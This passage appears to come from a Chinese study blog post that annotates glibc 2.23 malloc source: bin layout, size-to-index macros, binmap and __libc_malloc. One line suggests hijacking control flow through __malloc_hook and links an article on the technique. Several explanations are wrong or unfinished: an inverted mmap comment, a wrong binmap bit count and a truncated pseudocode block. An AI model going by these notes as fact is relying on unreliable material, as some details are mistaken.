<h5 id="check-remalloced-chunk-A-P-N"><a href="#check-remalloced-chunk-A-P-N" class="headerlink" title="check_remalloced_chunk(A,P,N)"></a>check_remalloced_chunk(A,P,N)</h5><p>对本应该属于A分配区的大小位S的堆块P进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"><span class="comment">//提取p堆块结构体中存放的size,由于低三位是标志复用,现在需要将其盖住</span></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))<span class="comment">//如果是mmap分配的堆块</span></span><br><span class="line">      <span class="comment">//如果是mmap分配的堆块,则</span></span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));<span class="comment">//首先检查给定的av是否是预期的p的所属分配区</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))<span class="comment">//如果p不是主分配区的</span></span><br><span class="line">        assert (av != &amp;main_arena);<span class="comment">//检查av是不是主分配区</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);<span class="comment">//检查本堆块是否正在使用</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);<span class="comment">//检查sz大小是否对齐</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);<span class="comment">//检查sz大小是否大于最小分配大小</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));<span class="comment">//检查p指向的地址是否对齐</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="unsortedbins"><a href="#unsortedbins" class="headerlink" title="unsortedbins"></a>unsortedbins</h4><p><code>smallbins</code>和<code>unsortedbins</code>中堆块的连接方式相同,都是双向链表</p>
<p>两者不同的是,<code>unsortedbin</code>中堆块可以大小各异,但是<code>smallbin</code>中一个桶子里的堆块必须相同</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin2.png" alt="smallbin2"></p>
<p><code>unsortedbin</code>的双向链表没有长短限制,采用头插法</p>
<h5 id="unsorted-chunks-M-bin-at-M-1"><a href="#unsorted-chunks-M-bin-at-M-1" class="headerlink" title="unsorted_chunks(M) (bin_at(M, 1))"></a>unsorted_chunks(M) (bin_at(M, 1))</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure>

<p>取unsortedbin桶子头</p>
<h4 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define NSMALLBINS 64</span><br></pre></td></tr></table></figure>

<p>bins的下标是从0到253,其中每个桶子占用两个bins,分别作为fd和bk指针</p>
<p>smallbins占用64个桶子,</p>
<p>其中第1个桶子是unsortedbin,第2个到第63个桶子是smallbins</p>
<p>从第64个及以后的桶子就是largebins</p>
<h5 id="next-bin"><a href="#next-bin" class="headerlink" title="next_bin"></a>next_bin</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr)((char *)(b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure>

<p>下一个bin就是<strong>mchunkptr指针</strong>的大小,也就是8个字节(在x64上)</p>
<p>左移一位也就是乘以2,因为每个Bin占用两个bin,分别作为fd和bk指针</p>
<h5 id="in-smallbin-range"><a href="#in-smallbin-range" class="headerlink" title="in_smallbin_range"></a>in_smallbin_range</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="line">  </span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line">#define NBINS             128</span><br><span class="line">#define NSMALLBINS         64</span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="line"></span><br><span class="line">///MALLOC_ALIGNMENT=16</span><br><span class="line">SMALLBIN_CORRECTION=FALSE=0</span><br><span class="line">MIN_LARGE_SIZE=(64-0)*16=1024</span><br></pre></td></tr></table></figure>

<p>smallbins有(64-2&#x3D;62)个桶子,最大管理的堆块为1023Bytes</p>
<p>再大一个字节都得放到largebin中</p>
<p>也就是说fastbins管理的堆块大小也在smallbin范围内,也就是说,<strong>fastbin相当于前部分比较小的smallbins的缓存</strong></p>
<h5 id="smallbin-index"><a href="#smallbin-index" class="headerlink" title="smallbin_index"></a>smallbin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))+ SMALLBIN_CORRECTION)</span></span><br><span class="line">	SMALLBIN_WIDTH=MALLOC_ALIGNMENT=<span class="number">16</span>字节</span><br><span class="line">    SMALLBIN_CORRECTION=<span class="number">0</span></span><br><span class="line">    smallbin_index(sz)=(sz&gt;&gt;<span class="number">4</span>)+<span class="number">0</span>=sz/<span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>这里参数sz是将请求大小换算成对应堆块整体大小之后的值,也就是包括了元数据</p>
<p>最小是0x20(元数据prev_size和size占用0x10,剩下的0x10是最小分配要求)</p>
<table>
<thead>
<tr>
<th>堆块大小(sz)</th>
<th>index</th>
</tr>
</thead>
<tbody><tr>
<td><strong>unsortedbin</strong></td>
<td>1</td>
</tr>
<tr>
<td><strong>smallbins</strong></td>
<td>[1,63]</td>
</tr>
<tr>
<td><code>[0x20,0x30)</code></td>
<td>2</td>
</tr>
<tr>
<td><code>[0x30,0x40)</code></td>
<td>3</td>
</tr>
<tr>
<td>….</td>
<td></td>
</tr>
<tr>
<td><code>[0x3f0,0x400)</code></td>
<td>63</td>
</tr>
<tr>
<td>&gt;0x400</td>
<td>largebins</td>
</tr>
</tbody></table>
<h5 id="bin-at"><a href="#bin-at" class="headerlink" title="bin_at"></a>bin_at</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr)(((char *)&amp;((m)-&gt;bins[((i)-1) * 2])) - offsetof(struct malloc_chunk, fd))</span></span><br><span class="line">	<span class="comment">//(m)-&gt;bins[((i)-1) * 2]-16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(s,m) ((size_t)&amp;(((s*)0)-&gt;m))</span></span><br></pre></td></tr></table></figure>

<p>这里m是malloc_state结构,i是使用smallbin_index宏计算出的堆块在smallbin中的下标,i从2开始,因为bins[0]和bins[1]是unsortedbin的地盘</p>
<p><code>m-&gt;bins[2*(i-1)]</code>指向的是下标为(2*(i-1))的桶子的桶子头,减去<code>fd</code>成员在一个堆块中的偏移量,得到的是该桶子头基址往前16字节的内存地址</p>
<p>显然这个地方是未知的,这是为啥呢?</p>
<p>最后将该地址又交给一个mbinptr也就是malloc_chunk*指针保管</p>
<p>那么此时,新指针+16的位置刚好是修正后的fd</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/9c28ec87e40a4ea615599a26bafa58c.png" alt="9c28ec87e40a4ea615599a26bafa58c"></p>
<p>而每个桶子头节点虽然也是malloc_chunk类型,但是只需要fd和bk两个指针,其他成员不需要</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbinhead.png" alt="smallbinhead"></p>
<h5 id="set-inuse-bit-at-offset"><a href="#set-inuse-bit-at-offset" class="headerlink" title="set_inuse_bit_at_offset"></a>set_inuse_bit_at_offset</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr)(((char *)(p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>将size字段的flag位设置上PREV_INUSE&#x3D;1,表示前一个物理相邻块正在被占用</p>
<h5 id="do-check-malloced-chunk"><a href="#do-check-malloced-chunk" class="headerlink" title="do_check_malloced_chunk"></a>do_check_malloced_chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> check_malloced_chunk(A, P, N) do_check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_malloced_chunk</span><span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  do_check_remalloced_chunk(av, p, s);</span><br><span class="line">  assert(prev_inuse(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h4><p>smallbins中的每两个相邻的桶子,其中堆块的大小相差0x16字节(在x64上)</p>
<p>Bin Index就是bin_at的计算结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">实际上largebins和smallbins可以看成一个整体,前<span class="number">64</span>个桶子是smallbins</span><br><span class="line">    前<span class="number">64</span>个桶子相邻两个桶子之间大小差<span class="number">8</span>字节</span><br><span class="line">   	然后<span class="number">32</span>个桶子相邻两个桶子之间大小差<span class="number">64</span>字节</span><br><span class="line">    然后<span class="number">16</span>个桶子相邻两个桶子之间大小差<span class="number">512</span>字节</span><br><span class="line">    ...</span><br><span class="line">	<span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">    <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">    <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">     <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">     <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">     <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">     <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>



<h5 id="largebin-range"><a href="#largebin-range" class="headerlink" title="largebin_range"></a>largebin_range</h5><p>malloc函数在分配时,超过smallbin_range大小的堆块才可能被放到largebin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz) \</span></span><br><span class="line"><span class="meta">  ((unsigned long)(sz) &lt; (unsigned long)MIN_LARGE_SIZE)</span></span><br></pre></td></tr></table></figure>



<p>在x64上,MIN_LARGE_SIZE&#x3D;1024</p>
<p>也就是说,大于等于1024的堆块才可能进入largebin</p>
<h5 id="largebin-index"><a href="#largebin-index" class="headerlink" title="largebin_index"></a>largebin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz)                              \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8             ? largebin_index_64(sz)     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big(sz) \ <span class="comment">//size_sz!=8并且对齐是16位,调用largebin_index_32_big</span></span></span><br><span class="line">                            : largebin_index_32(sz))		<span class="comment">//size_sz!=8并且对齐是8位,调用largebin_index_32</span></span><br><span class="line">x64上SIZE_SZ=<span class="number">8</span>(一个指针的大小),因此调用largebin_index_64(sz) 这个宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                                                                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long)(sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ? 48 + (((unsigned long)(sz)) &gt;</span>&gt; 6) : ((((unsigned long)(sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ? 91 + (((unsigned long)(sz)) &gt;</span>&gt; 9)   \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 12) <span class="string">&lt;= 10)  ? 110 + (((unsigned long)(sz)) &gt;</span>&gt; 12) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 15) <span class="string">&lt;= 4)   ? 119 + (((unsigned long)(sz)) &gt;</span>&gt; 15) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 18) <span class="string">&lt;= 2)   ? 124 + (((unsigned long)(sz)) &gt;</span>&gt; 18) \</span></span><br><span class="line"><span class="meta">                                                                                                                   : 126)</span></span><br></pre></td></tr></table></figure>

<p>这里的参数sz是包括元数据的整个堆块大小</p>
<p>又落在largebin范围内的堆块,最小是1024字节,因此sz右移6位后,最小是16,那么第一组从16到48,堆块的大小也就是从1024到3072</p>
<p>这些堆块对应的桶下标计算方式为,将其大小右移6位然后加上48,</p>
<p>也就是说,一个桶子中的堆块一样大,同一组内相邻两个桶子中堆块相差64B</p>
<table>
<thead>
<tr>
<th>largebins堆块大小</th>
<th>下标</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>[1024,1087)</td>
<td>64</td>
<td></td>
</tr>
<tr>
<td>[1088,1151)</td>
<td>65</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>[3072,3135)</td>
<td>96</td>
<td>这块儿到底塞到哪里我也不知道</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">   <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">   <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">    <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">    <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">    <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">    <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>

<p>整个largebin中有6组桶子,第一组占用32个Bins,相邻两个桶子之间的堆块相差64B</p>
<p>第二组占用16个Bins,相邻两个桶子之间的堆块相差16B</p>
<p>…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(sz/64&lt;=48)&#123;</span><br><span class="line">	return 48+sz/64</span><br><span class="line">&#125;else if(sz/512&lt;=20)&#123;</span><br><span class="line">	return 91+sz/512</span><br><span class="line">&#125;else if(sz/4096&lt;=10)&#123;</span><br><span class="line">	return 110+sz/4096</span><br><span class="line">&#125;else if(sz/)</span><br></pre></td></tr></table></figure>





<h4 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)  </span></span><br><span class="line">	BITSPERMAP=<span class="number">32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span></span><br><span class="line">	BINMAPSIZE=<span class="number">128</span>/<span class="number">32</span>=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br></pre></td></tr></table></figure>



<p>binmap是一个4个int的数组,共32位,不管是x64还是x86都是32位,用于标记32个largebin中是否有空闲的堆块</p>
<p>用于加快largebin中分配堆块时的最适寻找工作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span></span><br></pre></td></tr></table></figure>

<p>i是largebins下标,右移5位也就是除以32计算得到属于i下标的桶子属于map[0]还是map[1],map[2],map[3]哪一个管理</p>
<p>一个block也就是8个桶子归一个map管</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br></pre></td></tr></table></figure>

<p>计算i下标的largebins桶子属于其对应block的哪一位管</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))			//改,标记i下标的largebins有空闲堆块</span><br><span class="line">#define unmark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))		//删</span><br><span class="line">#define get_binmap(m, i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))			//查</span><br></pre></td></tr></table></figure>













<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>用户空间的malloc函数,实际上调用的是<code>__libc_malloc@glibc</code>,别名罢了</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>用户程序调用的malloc函数,实际上调用的是<code>__libc_malloc</code></p>
<p>在<code>glibc/malloc/malloc.c</code>中有这么一个<code>alias</code>声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure>

<p>而<code>__libc_malloc</code>实际上做的事情就两句话</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure>

<p>其他内容都是多线程上下锁,各种检查,编译优化了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;<span class="comment">//堆块指针</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));<span class="comment">//在实际调用int_malloc函数之前,首先调用钩子函数hook,hook指向__malloc_hook</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);<span class="comment">//获取分配区指针,返回值交给ar_ptr,传递参数bytes的作用是判断分配区空间是否足够</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//int_malloc函数是实际进行内存分配的函数</span></span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)<span class="comment">//分配失败并且没有获取到分配区</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);<span class="comment">//分配区获取失败,重试一次</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);<span class="comment">//重新获取分配区之后再次尝试切割堆块给victim</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)<span class="comment">//解锁,因为int_malloc中会对分配区上锁,解锁后方便其他线程分配内存</span></span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));<span class="comment">//最后一次检查</span></span><br><span class="line">    <span class="comment">//检查内容包括:</span></span><br><span class="line">        <span class="comment">//victim指针是否真的指向一个堆块</span></span><br><span class="line">        <span class="comment">//victim对应的堆块是否已经在bitmap中被标记</span></span><br><span class="line">        <span class="comment">//ar_ptr指向的分配区,是否是victim堆块所在的分配区</span></span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="atomic-forced-read"><a href="#atomic-forced-read" class="headerlink" title="atomic_forced_read"></a>atomic_forced_read</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> atomic_forced_read(x) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (x) __x; __asm (<span class="string">&quot;&quot;</span> : <span class="string">&quot;=r&quot;</span> (__x) : <span class="string">&quot;0&quot;</span> (x)); __x; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>原子读,这段内联汇编应该这样断句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm (</span><br><span class="line"> 	&quot;&quot; </span><br><span class="line"> 	: &quot;=r&quot; (__x) </span><br><span class="line"> 	: &quot;0&quot; (x)</span><br><span class="line"> ); </span><br></pre></td></tr></table></figure>

<p>首先””意思是没有一条指令,本内联代码块只需要使用输入输出约束</p>
<p><code>&quot;=r&quot; (__x) </code>输出操作数约束,意思是将<code>__x</code>视为输出变量,放到通用寄存器里</p>
<p><code>: &quot;0&quot; (x)</code>输入操作数约束,意思是x使用和第一个输出操作数(也就是<code>__x</code>)相同的约束</p>
<p>整个内联汇编的作用是将变量x拷贝到<code>__x</code>中</p>
<p>看完了也不知道”原子”如何保证的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>编译器分支预测优化</p>
<p><code>long __builtin_expect(long exp, long c);</code>期望exp表达式的值等于c</p>
<h5 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void *malloc_hook_ini(size_t sz,const void *caller) __THROW;</span><br><span class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</span><br></pre></td></tr></table></figure>

<p>分配前钩子,如果有注册钩子函数,则调用该钩子函数进行分配,直接返回钩子函数的返回值给句柄,不会再调用glibc自己实现的int_malloc</p>
<p>可以考虑篡改malloc_hook钩子劫持控制流</p>
<p><a target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理 | S3cana’s Blog (seanachao.github.io)</a></p>
<h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><p>这个函数很长,因为GNU向来要求函数嵌套不能太深,因此这个一个函数综合了从fastbin,smallbin,bin,unsortedbin等各种地方申请堆块的操作</p>
<p>glibc2.23&#x2F;malloc&#x2F;malloc.c 第3318行开始</p>
<p>函数签名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static void *_int_malloc (mstate av, size_t bytes);</span><br></pre></td></tr></table></figure>

<p>static决定本函数只能在malloc模块中可见,用户程序无法越级调用</p>
<p>void*返回值类型</p>
<p>两个参数,<code>mstate av</code>是分配区指针</p>
<p><code>size_t bytes</code>是企图分配的内存大小</p>
<h4 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/malloc.png" alt="malloc"></p>
